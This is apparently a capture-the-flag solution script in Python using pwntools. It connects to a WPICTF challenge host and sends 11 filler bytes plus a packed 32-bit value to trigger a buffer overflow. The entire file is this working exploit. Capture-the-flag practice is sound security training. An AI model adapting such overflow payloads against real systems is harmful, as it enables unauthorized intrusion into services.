from pwn import *

io = remote('smash184384.wpictf.xyz', 15724)

payload = b'A'*11+p32(0x37130042)
io.sendline(payload)
print(io.recvall())
